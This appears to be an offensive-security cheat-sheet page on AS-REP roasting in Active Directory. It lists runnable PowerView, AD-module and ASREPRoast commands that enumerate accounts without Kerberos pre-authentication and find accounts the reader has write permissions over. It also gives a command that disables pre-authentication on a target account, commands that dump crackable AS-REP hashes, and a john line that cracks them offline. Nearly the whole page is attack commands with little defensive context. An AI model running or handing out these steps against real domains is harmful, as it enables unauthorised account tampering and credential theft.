---
description: 'Kerberoast: AS-REPs'
---

# Kerberoast: AS-REPs

> If a user have the Kerberos PreAuth disabled, it is possible to grab user's crackable AS-REP and brute-force it offline (Enabled "Do not requiere kerberos preauthentication" in user's UserAccountControl settings). Very rare to see. Anyone can request an AS-REQ for that user, which it is encryped with the NTLM hash of that user.

### 2 Ways of doing it

1. If it is already disabled.
2. If we have enough permissions over a user (GenericAll, GenericWrite), we can disable preauth.

#### 1st way - Enumerate accounts with Kerberos pre-auth disabled

{% code overflow="wrap" %}
```bash
#Powerview_dev:
Get-DomainUser -PreAuthNotRequiered -Verbose

#AD-Module:
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```
{% endcode %}

#### 2nd way - Look users where we have permissions to disable pre+auth + set pre-auth disabled

{% code overflow="wrap" %}
```bash
#Find permissions
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "RDPUsers"} #Group we are member of
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "$USER"} #Our current user
```
{% endcode %}

```bash
#Set pre-auth disabled
Set-DomainObject -Identity $USER -XOR @{useraccountcontrol=4194304} -Verbose
```

***

## Once the user have pre-auth disabled:

### Request AS-REP

```bash
#Using ASREPRoast:
. .\ASREPRoast-master\AsRepRoast.ps1

Get-ASREPHash -UserName $USER -Verbose #Single user
Invoke-ASREPRoast -Verbose #All users

#Output is like "$krb5...", crack it with "john file.txt --wordlist=$WORDLIST"
```
